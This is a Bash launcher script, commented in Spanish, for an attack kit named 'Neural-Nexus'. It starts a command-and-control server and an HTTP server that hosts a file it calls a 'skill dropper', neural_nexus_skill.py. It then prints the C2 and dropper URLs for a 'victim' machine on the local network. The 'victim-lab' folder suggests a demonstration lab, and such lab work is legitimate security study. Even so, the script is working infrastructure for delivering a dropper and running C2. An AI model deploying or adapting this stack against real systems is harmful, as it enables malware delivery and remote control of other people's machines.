#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  Neural-Nexus  ·  C2 + File Server
#
#  Lanza simultáneamente:
#    • C2 server     → http://localhost:$C2_PORT  (defecto 5001)
#    • HTTP file srv → http://localhost:$FS_PORT  (defecto 8001)
#                      sirve victim-lab/skill/  →  neural_nexus_skill.py
#
#  Prerequisito: haber ejecutado ./setup.sh al menos una vez.
#
#  Uso:
#    chmod +x start-c2.sh
#    ./start-c2.sh                     # C2 :5001 + file server :8001
#    C2_PORT=5001 FS_PORT=9000 ./start-c2.sh
#    ./start-c2.sh --no-fileserver     # solo C2, sin HTTP server
# ─────────────────────────────────────────────────────────────────────────────

set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; PRP='\033[0;35m'; BLD='\033[1m'; RST='\033[0m'

ok()   { echo -e "${GRN}  ✓${RST}  $*"; }
info() { echo -e "${CYN}  ●${RST}  $*"; }
warn() { echo -e "${YEL}  ⚠${RST}  $*"; }
fail() { echo -e "${RED}  ✗  $*${RST}"; exit 1; }
step() { echo -e "\n${BLD}${PRP}▶ $*${RST}"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
C2_DIR="$SCRIPT_DIR/server"
SKILL_DIR="$SCRIPT_DIR/victim-lab/skill"
VENV="$SCRIPT_DIR/.venv"

C2_PORT="${C2_PORT:-5001}"
FS_PORT="${FS_PORT:-8001}"
C2_LOG="$SCRIPT_DIR/.c2.log"
FS_LOG="$SCRIPT_DIR/.fileserver.log"

START_FS=true
for arg in "$@"; do
  case "$arg" in
    --no-fileserver) START_FS=false ;;
    --help|-h)
      echo ""; echo "  Uso: ./start-c2.sh [--no-fileserver]"
      echo "  Env: C2_PORT (def 5001)  FS_PORT (def 8001)"
      echo ""; exit 0 ;;
    *) warn "Argumento desconocido: $arg (ignorado)" ;;
  esac
done

C2_PID=0; FS_PID=0

# ── Limpieza al salir ─────────────────────────────────────────────────────────
cleanup() {
  echo ""
  info "Deteniendo procesos…"
  [[ $C2_PID -ne 0 ]] && kill "$C2_PID" 2>/dev/null && ok "C2 server detenido (PID $C2_PID)" || true
  [[ $FS_PID -ne 0 ]] && kill "$FS_PID" 2>/dev/null && ok "File server detenido (PID $FS_PID)" || true
  echo ""
}
trap cleanup EXIT INT TERM

# ── Banner ────────────────────────────────────────────────────────────────────
clear
echo -e "${PRP}"
cat << 'BANNER'
  ███╗   ██╗███████╗██╗   ██╗██████╗  █████╗ ██╗         ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
  ████╗  ██║██╔════╝██║   ██║██╔══██╗██╔══██╗██║         ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
  ██╔██╗ ██║█████╗  ██║   ██║██████╔╝███████║██║         ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
  ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██╔══██║██║         ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
  ██║ ╚████║███████╗╚██████╔╝██║  ██║██║  ██║███████╗    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
  ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
BANNER
echo -e "${RST}"
echo -e "  ${BLD}C2 server  +  HTTP File Server${RST}"
echo -e "  ${YEL}────────────────────────────────────────────────────────────────────${RST}"
echo -e "  ${CYN}C2 Panel  ${RST}   → ${BLD}http://localhost:${C2_PORT}${RST}"
$START_FS && echo -e "  ${PRP}File Server${RST}  → ${BLD}http://localhost:${FS_PORT}/neural_nexus_skill.py${RST}" || true
echo -e "  ${YEL}────────────────────────────────────────────────────────────────────${RST}\n"

cd "$SCRIPT_DIR"

# ─────────────────────────────────────────────────────────────────────────────
# PREFLIGHT
# ─────────────────────────────────────────────────────────────────────────────
step "Comprobaciones previas"

[[ ! -f "$VENV/bin/activate" ]] && fail "venv no encontrado en $VENV\n     Ejecuta primero: ${YEL}./setup.sh${RST}"
ok "venv: $VENV"

[[ ! -f "$C2_DIR/app.py" ]] && fail "server/app.py no encontrado"
ok "server/app.py encontrado"

if $START_FS; then
  [[ ! -f "$SKILL_DIR/neural_nexus_skill.py" ]] && fail "victim-lab/skill/neural_nexus_skill.py no encontrado"
  ok "skill dropper encontrado"
fi

# Comprobar que los puertos estén libres
for PORT_VAR in C2_PORT FS_PORT; do
  PORT="${!PORT_VAR}"
  [[ "$PORT_VAR" == "FS_PORT" ]] && ! $START_FS && continue
  if lsof -ti :"$PORT" &>/dev/null 2>&1; then
    warn "Puerto $PORT ya en uso — posible proceso previo, intentando continuar"
  fi
done

# ─────────────────────────────────────────────────────────────────────────────
# LANZAR C2 SERVER
# ─────────────────────────────────────────────────────────────────────────────
step "Lanzando C2 server (puerto ${C2_PORT})"

info "Iniciando server/app.py …"
PORT="$C2_PORT" "$VENV/bin/python" "$C2_DIR/app.py" \
  >> "$C2_LOG" 2>&1 &
C2_PID=$!

sleep 2
if ! kill -0 "$C2_PID" 2>/dev/null; then
  echo ""
  fail "C2 process terminó inmediatamente.\n     Revisa el log: ${YEL}tail -f $C2_LOG${RST}"
fi

ok "C2 running (PID $C2_PID)  →  logs: $C2_LOG"

# ─────────────────────────────────────────────────────────────────────────────
# LANZAR FILE SERVER
# ─────────────────────────────────────────────────────────────────────────────
if $START_FS; then
  step "Lanzando HTTP file server (puerto ${FS_PORT})"

  info "Sirviendo directorio: victim-lab/skill/"
  (cd "$SKILL_DIR" && python3 -m http.server "$FS_PORT" \
    >> "$FS_LOG" 2>&1) &
  FS_PID=$!

  sleep 1
  if ! kill -0 "$FS_PID" 2>/dev/null; then
    warn "File server no arrancó — continúa sin él"
    FS_PID=0
  else
    ok "File server running (PID $FS_PID)  →  logs: $FS_LOG"
  fi
fi

# ─────────────────────────────────────────────────────────────────────────────
# HEALTH CHECK
# ─────────────────────────────────────────────────────────────────────────────
step "Esperando a que el C2 esté listo"

printf "  %-30s " "C2 server (localhost:${C2_PORT})"
for i in $(seq 1 20); do
  if curl -sf --max-time 2 "http://localhost:${C2_PORT}" >/dev/null 2>&1; then
    echo -e "${GRN}UP${RST}"; break
  fi
  printf "."
  sleep 1
  if [[ $i -eq 20 ]]; then echo -e " ${YEL}SLOW${RST} (puede tardar unos segundos más)"; fi
done

# ─────────────────────────────────────────────────────────────────────────────
# RESUMEN
# ─────────────────────────────────────────────────────────────────────────────
HOST_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' \
          || hostname -I 2>/dev/null | awk '{print $1}' || echo "")

echo ""
echo -e "  ${BLD}${GRN}Stack activo:${RST}"
echo -e "  ${YEL}┌───────────────────────────────────────────────────────────────────┐${RST}"
printf  "  ${YEL}│${RST}  %-14s  PID %-7s  %-38s  ${YEL}│${RST}\n" "C2 Panel"    "$C2_PID"  "http://localhost:${C2_PORT}"
if $START_FS && [[ $FS_PID -ne 0 ]]; then
  printf "  ${YEL}│${RST}  %-14s  PID %-7s  %-38s  ${YEL}│${RST}\n" "File Server" "$FS_PID"  "http://localhost:${FS_PORT}/neural_nexus_skill.py"
fi
echo -e "  ${YEL}└───────────────────────────────────────────────────────────────────┘${RST}"
echo ""

if [[ -n "$HOST_IP" && "$HOST_IP" != "127.0.0.1" ]]; then
  echo -e "  ${BLD}Acceso desde la red local (víctima):${RST}"
  echo -e "  ${CYN}NN_C2=${RST}${BLD}http://${HOST_IP}:${C2_PORT}${RST}"
  $START_FS && echo -e "  Dropper URL: ${CYN}http://${HOST_IP}:${FS_PORT}/neural_nexus_skill.py${RST}" || true
  echo ""
fi

echo -e "  ${BLD}Logs en tiempo real:${RST}"
echo -e "  ${YEL}tail -f $C2_LOG${RST}"
$START_FS && [[ $FS_PID -ne 0 ]] && echo -e "  ${YEL}tail -f $FS_LOG${RST}" || true
echo ""
echo -e "  ${YEL}Ctrl-C para detener ambos procesos${RST}\n"

# ─────────────────────────────────────────────────────────────────────────────
# WAIT — tail C2 log
# ─────────────────────────────────────────────────────────────────────────────
echo -e "  ${BLD}${PRP}── C2 log ────────────────────────────────────────────────────────${RST}"
tail -f "$C2_LOG" &
TAIL_PID=$!

# Wait for C2 to die (or Ctrl-C)
wait "$C2_PID" 2>/dev/null || true
kill "$TAIL_PID" 2>/dev/null || true
